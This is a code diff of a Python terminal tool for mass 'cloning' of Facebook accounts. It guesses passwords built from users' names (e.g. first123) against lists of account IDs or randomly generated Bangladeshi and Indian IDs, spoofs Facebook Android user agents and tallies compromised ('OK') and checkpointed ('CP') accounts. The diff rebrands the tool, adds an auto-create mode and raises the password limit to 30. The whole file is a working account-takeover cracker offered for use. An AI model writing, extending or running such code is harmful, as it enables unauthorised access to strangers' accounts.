@@ -99,10 +99,11 @@ def menu():
     clear()
     print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
     print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
-    print(f'{G1}[{A}3{G3}]{G3} CONTACT TOOL OWNER')
+    print(f'{G1}[{A}3{G4}]{G3} AUTO CREAT CLONING')
+    print(f'{G1}[{A}4{G4}]{G4} CONTACT TOOL OWNER')
     print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
     print(f'Tool Type : \033[1;33m trail\033[1;37m')
-    print(f'NOTE : \033[1;31m send feedback  :)\033[1;37m')
+    print(f'NOTE : \033[1;31m JYA  GORKHALI :)\033[1;37m')
     linex()
     select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
     if select =='1':
@@ -124,8 +125,8 @@ def menu():
 #__________________[ RANDOM ]__________________#      
 def _randm_():   
     clear()
-    print(f'{G1}[{A}1{G1}]{G1} MADA CLONING')
-    print(f'{G1}[{A}2{G2}]{G2} MADA1 CLONING')
+    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
+    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
     print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
     linex()
     select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
@@ -227,7 +228,7 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/PRASHANT.txt');linex()
+        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SP.txt');linex()
         self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
         try:
             self.id = open(self.file).read().splitlines()
@@ -245,7 +246,7 @@ class main_crack():
         try:
             global oks,cps,loop
             ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}PRASHANT-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}SP-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -314,7 +315,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r{G1}[{A}PRASHANT-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}SP-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -381,15 +382,15 @@ class main_crack():
     def pasw(self):       
             pw = []
             clear()
-            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5 / Best 12 Pass');linex()
+            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5 / Best 30 Pass');linex()
             sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
             clear()
-            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@@@')
+            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@123 etc: ')
             linex()
             if sl =='':
-                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 20')
+                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 30 ')
             elif sl > 20:
-                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 20')
+                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
             else:
                 for sr in range(sl):
                     pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
